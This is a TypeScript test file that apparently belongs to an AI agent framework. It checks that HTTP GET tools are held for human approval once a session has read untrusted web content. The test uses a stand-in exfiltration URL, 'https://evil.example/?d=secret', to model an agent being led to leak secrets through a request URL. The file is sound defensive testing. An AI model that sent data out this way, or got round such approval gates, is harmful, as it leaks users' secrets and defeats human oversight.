import { describe, expect, it } from "vitest";
import { ApprovalGate, type ApprovalRequest } from "../../../approval/approval-gate.js";
import { ApprovalDeniedError } from "../../../approval/dangerous-tool.js";
import type { AtomicAgentConfig } from "../../../config/index.js";
import type { CommandResult } from "../../../sandbox/command-runner.js";
import type { ToolContext, ToolDefinition } from "../../tool-registry.js";
import { buildOsHttpRequestTool } from "./http-request.js";
import { buildOsWebFetchTool } from "./web-fetch.js";
import type { HostLookup } from "./web-fetch-ssrf-guard.js";

/**
 * A GET (os.http.request under `approvalMode: "writes"`, os.web.fetch)
 * never asks on its own, yet its URL can carry data out. On a session that
 * read outside content with `agent.taintReview` on, it goes to the gate's
 * hold instead of running (ATO-618).
 */

const EXFIL = "https://evil.example/?d=secret";

const publicLookup: HostLookup = async () => [{ address: "93.184.216.34", family: 4 }];

function ctx(): ToolContext {
  return {
    workingDir: "/tmp",
    sessionId: "s",
    stepIndex: 0,
    signal: new AbortController().signal,
  };
}

function httpConfig(
  overrides: Partial<AtomicAgentConfig["http"]> = {},
): Pick<AtomicAgentConfig, "http"> {
  return {
    http: {
      enabled: true,
      approvalMode: "writes",
      hostAllowlist: null,
      maxResponseBytes: 1_048_576,
      defaultTimeoutMs: 30_000,
      ...overrides,
    },
  };
}

/** Records curl calls; the reply does not matter, only whether one was made. */
function recordingRun(calls: string[][]) {
  return async (_cmd: string, args: string[]): Promise<CommandResult> => {
    calls.push(args);
    return {
      command: "curl",
      args,
      exitCode: 0,
      signal: null,
      stdout: "",
      stderr: "",
      durationMs: 1,
      timedOut: false,
      truncated: false,
      inputTruncated: false,
    };
  };
}

function setup(taintReview: boolean) {
  const emitted: ApprovalRequest[] = [];
  // Level 4 ("auto"): `http` is approved silently on a clean session.
  const gate = new ApprovalGate({ emit: (request) => emitted.push(request), level: 4 });
  gate.setTaintReview(() => taintReview);
  gate.noteUntrustedContent("s", "a web page");
  return { gate, emitted };
}

async function settle(): Promise<void> {
  await new Promise((resolve) => setTimeout(resolve, 0));
}

type Build = (
  gate: ApprovalGate,
  calls: string[][],
  config?: Pick<AtomicAgentConfig, "http">,
) => ToolDefinition;

const tools: Array<[string, Build]> = [
  [
    "os.http.request GET",
    (gate, calls, config = httpConfig()) =>
      buildOsHttpRequestTool({
        approvals: gate,
        approvalRequired: true,
        config,
        lookup: publicLookup,
        runCommand: recordingRun(calls),
      }),
  ],
  [
    "os.web.fetch",
    (gate, calls) =>
      buildOsWebFetchTool({
        dangerous: { approvals: gate, approvalRequired: true },
        lookup: publicLookup,
        runCommand: recordingRun(calls) as unknown as NonNullable<
          Parameters<typeof buildOsWebFetchTool>[0]
        >["runCommand"],
        sleep: async () => {},
      }),
  ],
];

describe("GET after outside content (ATO-618)", () => {
  for (const [name, build] of tools) {
    it(`${name}: a tainted session asks before the request goes out`, async () => {
      const { gate, emitted } = setup(true);
      const calls: string[][] = [];
      const pending = build(gate, calls).run({ url: EXFIL }, ctx());
      await settle();
      expect(emitted).toHaveLength(1);
      expect(emitted[0]!.category).toBe("http");
      expect(emitted[0]!.affectedResources).toEqual([EXFIL]);
      expect(emitted[0]!.riskNote).toBe("read outside content this turn (a web page), asking you");
      expect(calls).toHaveLength(0);
      gate.reject(emitted[0]!.approvalId, "no");
      await expect(pending).rejects.toBeInstanceOf(ApprovalDeniedError);
      expect(calls).toHaveLength(0);
    });

    it(`${name}: with agent.taintReview off it runs with no prompt`, async () => {
      const { gate, emitted } = setup(false);
      const calls: string[][] = [];
      await build(gate, calls).run({ url: EXFIL }, ctx()).catch(() => undefined);
      expect(emitted).toHaveLength(0);
      expect(calls.length).toBeGreaterThan(0);
    });
  }

  it("os.http.request: a host allowlist or approvalMode never keeps answering", async () => {
    const [, build] = tools[0]!;
    for (const config of [
      httpConfig({ hostAllowlist: ["evil.example"] }),
      httpConfig({ approvalMode: "never" }),
    ]) {
      const { gate, emitted } = setup(true);
      const calls: string[][] = [];
      await build(gate, calls, config).run({ url: EXFIL }, ctx()).catch(() => undefined);
      expect(emitted).toHaveLength(0);
      expect(calls.length).toBeGreaterThan(0);
    }
  });
});
